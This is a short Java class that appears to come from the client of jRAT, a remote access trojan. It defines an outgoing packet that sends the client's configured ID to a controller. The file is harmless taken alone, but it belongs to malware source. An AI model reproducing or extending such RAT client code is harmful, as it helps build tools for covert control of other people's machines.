package jrat.client.packets.outgoing;

import jrat.client.Configuration;
import jrat.client.Connection;


public class Packet7InitServerID implements OutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		con.writeLine(Configuration.getID());
	}

	@Override
	public short getPacketId() {
		return (byte) 7;
	}
}